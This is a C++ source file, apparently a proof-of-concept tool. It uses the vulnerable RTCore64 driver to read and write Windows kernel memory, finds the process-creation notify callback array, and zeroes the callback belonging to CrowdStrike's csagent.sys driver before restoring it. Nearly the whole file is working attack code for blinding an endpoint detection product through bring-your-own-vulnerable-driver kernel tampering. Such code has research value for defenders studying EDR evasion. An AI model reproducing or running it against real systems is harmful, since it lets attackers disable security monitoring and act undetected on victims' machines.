#include "main_stuff.h"


int main(int argc, char ** argv)
{

	char target_driver[] = "csagent.sys"; // CrowdStrike driver name 

	//// Get handle to the driver ////

	HANDLE device = CreateFile((LPCWSTR)L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[+] Failed to get a handle to the device.\n");

		return -1;
	}
	else
	{
		printf("[+] Got a handle to the device\n");
	}


	// Get Kernel base address 

	DWORD64 kernel_image_base = NULL;

	kernel_image_base = find_kernel_base();

	if (kernel_image_base == NULL)
	{
		printf("[+] Failed to obtain kernel base address\n");

		return -1;
	}

	printf("[+] Obtained kernel base address : 0x%llx\n", kernel_image_base);


	// Get PsSetCreateProcessNotifyRoutine Address

	DWORD64 PsSetCreateProcessNotifyRoutine_address = get_PsSetCreateProcessNotifyRoutine(kernel_image_base);

	printf("[+] PsSetCreateProcessNotifyRoutine_address : 0x%llx\n", PsSetCreateProcessNotifyRoutine_address);


	// Get PspCreateProcessNotifyRoutine Address 

	DWORD64 PspSetCreateProcessNotifyRoutine_address = get_PspSetCreateProcessNotifyRoutine(device, PsSetCreateProcessNotifyRoutine_address);

	printf("[+] PspSetCreateProcessNotifyRoutine address : 0x%llx\n", PspSetCreateProcessNotifyRoutine_address);


	// Get PspCreateProcessNotifyRoutine array address 

	DWORD64 PspCreateProcessNotifyRoutine_array_address = get_PspCreateProcessNotifyRoutine_arr(device, PspSetCreateProcessNotifyRoutine_address);

	printf("[+] PspCreateProcessNotifyRoutine address : 0x%llx\n", PspCreateProcessNotifyRoutine_array_address);


	// Enumerate all the callbacks

	printf("[+] Enumerating callbacks :\n\n");

	DWORD64 temp_address = 0, saved_callback = 0;

	int target_callback_index = 0;

	BOOL scan_res = 0;

	for (int k = 0; k < 64; k++)
	{

		DWORD64 callback = ReadMemoryDWORD64(device, PspCreateProcessNotifyRoutine_array_address + (k * 8));

		printf("[+] Callback no. [%d] : 0x%llx\n", k, callback);

		// skip null entries
		if (callback == 0)
			continue;

		// Get the pointer address

		temp_address = callback;

		temp_address = (temp_address &= ~(1ULL << 3) + 0x1);

		// dereference this pointer to get the real address of the function related to this callback

		DWORD64 callback_address = ReadMemoryDWORD64(device, temp_address);

		printf("[+] Callback function address : 0x%llx\n", callback_address);


		scan_res = enum_drivers(callback_address, target_driver, k);

		if (scan_res == 1)
		{

			saved_callback = callback; // save callback value for restore
			
			target_callback_index = k;

			printf("[+] Target Found!\n");

			printf("[+] Callback index : %d\n", target_callback_index);

			printf("[+] Callback : 0x%llx\n", saved_callback);
		
			break;

		}

	}

	if (scan_res == 0) // target driver was not found
	{
		printf("[+] Target callback was not found!\n[+] Quitting....\n");

		return -1; // exit
	}


	puts("[+] Press any key to remove the target callback\n");

	std::cin.get();

	WriteMemoryDWORD64(device, PspCreateProcessNotifyRoutine_array_address + (target_callback_index * 8), 0);


	//// display all the callbacks again to make sure the callback was removed

	for (int k = 0; k < 64; k++)
	{

		DWORD64 callback = ReadMemoryDWORD64(device, PspCreateProcessNotifyRoutine_array_address + (k * 8));

		if (k == target_callback_index)
		{
			printf("[+] 0x%llx                 <-- Target Callback!\n", callback);
		}
		else
		{
			printf("[+] 0x%llx\n", callback);
		}

	}

	//// restore the callback
	puts("[+] Press any key to restore the callbacks\n");

	std::cin.get();

	WriteMemoryDWORD64(device, PspCreateProcessNotifyRoutine_array_address + (target_callback_index * 8), saved_callback);

	//// disaplay the callback after restore
	puts("[+] After restore!\n");

	for (int k = 0; k < 64; k++)
	{

		DWORD64 callback = ReadMemoryDWORD64(device, PspCreateProcessNotifyRoutine_array_address + (k * 8));

		if (k == target_callback_index)
		{
			printf("[+] 0x%llx <-- Target Callback!\n", callback);
		}
		else
		{
			printf("[+] 0x%llx\n", callback);
		}


	}

	printf("[+] BYE BYE !\n");

	return 0;

}

